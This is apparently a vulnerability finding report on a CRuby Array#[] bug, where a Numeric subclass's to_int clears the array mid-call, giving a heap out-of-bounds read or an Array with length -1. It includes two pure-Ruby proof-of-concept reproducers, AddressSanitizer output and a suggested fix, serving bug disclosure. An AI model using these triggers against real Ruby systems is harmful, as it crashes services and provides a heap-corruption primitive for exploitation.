# FINDING-004 — `Array#[]` (Range / ArithmeticSequence) negative-length: OOB read + corrupt array

- **Status:** CONFIRMED on CRuby `master` `c4e06b4e30` (ruby 4.1.0dev, aarch64-linux), ASan build
  `taxoshop/cruby-asan-ubsan:current`. **No matching upstream report found — apparently novel.**
- **Parent taxonomy:** `workflow-0137` (reentrant argument conversion invalidates native state).
  Battery8. The most severe finding so far: yields both a bounded OOB read *and* a corrupt
  `Array` object with `RARRAY_LEN == -1` (a heap-corruption primitive).
- **Distinct from FINDING-002/003:** different function (`rb_ary_aref1`/`ary_make_partial{,_step}`)
  and a different defect — the length clamp *exists* but returns `-1` and the caller only guards
  `len == 0`, not `len < 0`.

## Root cause

`rb_ary_aref1` (array.c:1928) for a Range/ArithmeticSequence index:

```
array.c:1937   switch (rb_arithmetic_sequence_beg_len_step(arg, &beg, &len, &step,
                                                            RARRAY_LEN(ary), 0)) {
...
array.c:1944       len = ary_subseq_len(ary, beg, len);
array.c:1945       if (len == 0) return ary_new(klass, 0);         // <-- only guards ==0, not <0
array.c:1946       if (step == 1) return ary_make_partial(ary, klass, beg, len);
array.c:1947       return ary_make_partial_step(ary, klass, beg, len, step);
```

`rb_arithmetic_sequence_beg_len_step` extracts the Range/ArithmeticSequence's begin/end/step,
converting them with `NUM2LONG`/`to_int` — **user code**. If an endpoint's `to_int` shrinks the
receiver (`ary.clear`), then `beg` (computed against the *pre-shrink* length passed at line 1937)
can exceed the new length. `ary_subseq_len` (array.c:1761) re-reads the live length and returns
**-1** for `beg > alen`:

```
array.c:1765   if (beg > alen) return -1;
```

Line 1945 checks only `len == 0`, so `len == -1` flows on:

- **Step != 1 (ArithmeticSequence):** `ary_make_partial_step(ary, …, beg, -1, step)` hits
  `if (step > 0 && step >= len)` (true, since `step >= -1`) and reads `values[offset]` at
  `offset == beg` (array.c:1303) from the shrunk buffer → **heap-buffer-overflow READ**.
- **Step == 1 (plain Range):** `ary_make_partial(ary, …, beg, -1)` builds a shared Array with
  `ARY_SET_LEN(result, -1)` → **an `Array` whose `RARRAY_LEN == -1`** with a dangling shared
  pointer offset `beg` into the freed/cleared buffer. Using it (`res + [..]`, `res.dup`) performs a
  `(size_t)-1` `ary_memcpy` → SEGV / wild write.

## Reproducers (no ctypes, pure Ruby)

Bounded OOB read — `ruby_audit1/repro/h137_aref_step.rb`:

```ruby
class Evil < Numeric
  def initialize(v); @v = v; end
  def val; @v; end
  def <=>(o); @v <=> (o.is_a?(Evil) ? o.val : o); end
  def to_int; $a.clear; @v; end
  def to_i; @v; end
  def coerce(o); [o, @v]; end
end
$a = (1..3000).to_a
seq = Range.new(Evil.new(2900), Evil.new(2950)).step(2)   # Enumerator::ArithmeticSequence
$a[seq]                                                   # heap-buffer-overflow READ
```

Corruption primitive — `ruby_audit1/repro/h137_aref_neglen.rb` (same `Evil`):

```ruby
$a = (1..3000).to_a
res = $a[Range.new(Evil.new(2900), Evil.new(2950))]
res.length    # => -1   (an Array object with negative length)
res + [1, 2, 3]   # (size_t)-1 memcpy -> SEGV (nondeterministic; crashed exit 139 in testing)
```

A `Numeric` subclass is required so the Range endpoints are comparable (Range creation validates
`begin <=> end`) yet still run user `to_int` during `beg_len_step` extraction. `beg` must exceed
the post-shrink length (place it near the original end).

## Sanitizer output (saved: `ruby_audit1/logs/h137_aref.asan.txt`)

```
==7==ERROR: AddressSanitizer: heap-buffer-overflow ... READ of size 8 ...
    #0 ary_make_partial_step  array.c:1303
    #1 rb_ary_aref1           array.c:1947
    #2 vm_opt_aref            vm_insnhelper.c:7224
SUMMARY: AddressSanitizer: heap-buffer-overflow array.c:1303:9 in ary_make_partial_step
```

## Trigger conditions

- `Array#[]` / `Array#slice` with a **Range or ArithmeticSequence** index.
- Endpoints are a `Numeric` subclass (comparable) whose `to_int` shrinks the receiver.
- `beg` computed from the pre-shrink length exceeds the post-shrink length (⇒ `ary_subseq_len`
  returns -1). Step ≠ 1 gives a bounded OOB read; step == 1 gives a negative-length Array.

## Fix direction (for reference; we do not patch)

Change the guard at array.c:1945 to `if (len <= 0) return ary_new(klass, 0);` (treat the `-1`
sentinel like empty), or re-validate `beg`/`len` against the current `RARRAY_LEN(ary)` after
`rb_arithmetic_sequence_beg_len_step` returns.

## Duplicate analysis

- **git history (checkout):** no fix in `array.c` for aref/ArithmeticSequence + reentrancy +
  negative length.
- **Ruby tracker (web):** no matching report. Related but distinct: #16812 (arith-seq slicing
  *feature*), #20427 (`Array#sort!` block-mutation overflow), #6203 (values_at range semantics).
- **Caveat:** web search is not exhaustive; recommend a final manual bugs.ruby-lang.org search
  ("ArithmeticSequence", "ary_make_partial", "negative length"). This is the strongest candidate
  to file — it is a memory-corruption primitive (negative-length Array) reachable from pure Ruby.
